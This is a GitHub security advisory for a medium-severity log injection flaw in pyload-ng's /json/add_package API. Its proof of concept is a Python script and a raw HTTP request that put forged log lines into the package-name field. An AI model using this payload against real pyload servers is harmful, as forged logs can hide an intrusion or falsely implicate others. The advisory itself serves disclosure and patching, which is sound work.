# [M] Pyload log Injection via API /json/add_package in add_name parameter

## Summary
Severity: Medium
Advisory: GHSA-3wwm-hjv7-23r3
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2025-07-30
Source: https://github.com/advisories/GHSA-3wwm-hjv7-23r3
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0

## Details
### Summary
A log injection vulnerability was identified in `pyload` in API `/json/add_package`. This vulnerability allows user with add packages permission to inject arbitrary messages into the logs gathered by `pyload`.
### Details
`pyload` will generate a log entry when creating new package using API `/json/add_package`. This entry will be in the form of `Added package 'NAME_OF_PACKAGE' containing 'NUMBER_OF_LINKS' links`. However, when supplied with the name of new package containing a newline, this newline is not properly escaped. Newlines are also the delimiter between log entries. This allows the attacker to inject new log entries into the log file.

### PoC
Run `pyload` in the default configuration by running the following command
```
pyload
```
We can now sign in as the pyload user who at least have add packages permissions. In my example, I will use the admin account to demonstrate this vulnerability. Now as an admin user, view the logs at `http://localhost:8000/logs`
<img width="1918" height="912" alt="image" src="https://github.com/user-attachments/assets/e6510af6-768b-4ddd-a4f2-3972618e1d37" />
Any attacker who at least have add packages permissions can now make the following request by crafting a python code to inject arbitrary logs.
```
import requests

session = requests.session()

burp0_url = "http://localhost:8000/json/add_package"
burp0_cookies = {"pyload_session_8000": "SESSION-ID-HERE"}
burp0_headers = {"sec-ch-ua-platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"", "sec-ch-ua-mobile": "?0", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Accept": "*/*", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryqRJM6zIUcE7ttXDf", "Origin": "http://localhost:8000", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:8000/collector", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
burp0_data = "------WebKitFormBoundaryqRJM6zIUcE7ttXDf\r\nContent-Disposition: form-data; name=\"add_name\"\r\n\r\nFake new package containing 1 links\r\n[2025-07-23 04:32:19]  PWNED               SeaWind  GET PWNED\r\n[2025-07-23 04:32:19]  INFO                pyload Added package Normal package\r\n------WebKitFormBoundaryqRJM6zIUcE7ttXDf\r\nContent-Disposition: form-data; name=\"add_links\"\r\n\r\n123\r\n------WebKitFormBoundaryqRJM6zIUcE7ttXDf\r\nContent-Disposition: form-data; name=\"add_password\"\r\n\r\n123\r\n------WebKitFormBoundaryqRJM6zIUcE7ttXDf\r\nContent-Disposition: form-data; name=\"add_file\"; filename=\"tt\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryqRJM6zIUcE7ttXDf\r\nContent-Disposition: form-data; name=\"add_dest\"\r\n\r\n0\r\n------WebKitFormBoundaryqRJM6zIUcE7ttXDf--\r\n"
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
```
The Burpsuite HTTP Request for the above code
```
POST /json/add_package HTTP/1.1
Host: localhost:8000
Content-Length: 799
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqRJM6zIUcE7ttXDf
Origin: http://localhost:8000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8000/collector
Accept-Encoding: gzip, deflate, br
Cookie: pyload_session_8000=SESSIONS-ID-HERE
Connection: keep-alive

------WebKitFormBoundaryqRJM6zIUcE7ttXDf
Content-Disposition: form-data; name="add_name"

Fake new package containing 1 links
[2025-07-23 04:32:19]  HACKER               SeaWind  GET PWNED
[2025-07-23 04:32:19]  INFO               pyload Added package Normal package
------WebKitFormBoundaryqRJM6zIUcE7ttXDf
Content-Disposition: form-data; name="add_links"

123
------WebKitFormBoundaryqRJM6zIUcE7ttXDf
Content-Disposition: form-data; name="add_password"

123
------WebKitFormBoundaryqRJM6zIUcE7ttXDf
Content-Disposition: form-data; name="add_file"; filename="tt"
Content-Type: application/octet-stream


------WebKitFormBoundaryqRJM6zIUcE7ttXDf
Content-Disposition: form-data; name="add_dest"

0
------WebKitFormBoundaryqRJM6zIUcE7ttXDf--

```
After executing the following python code and send the request successfully, if we now were to look at the logs again, we see that the entry has successfully been injected.
<img width="1920" height="911" alt="image" src="https://github.com/user-attachments/assets/0e77c7ac-e5f6-4227-843a-ef548071bf02" />

### Impact
Forged or otherwise, corrupted log files can be used to cover an attacker’s tracks or even to implicate another party in the commission of a malicious act.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-3wwm-hjv7-23r3
- https://github.com/pyload/pyload/commit/ddf8a48b83aaf36052b08732c424cffcf9ffccca
- https://github.com/pyload/pyload
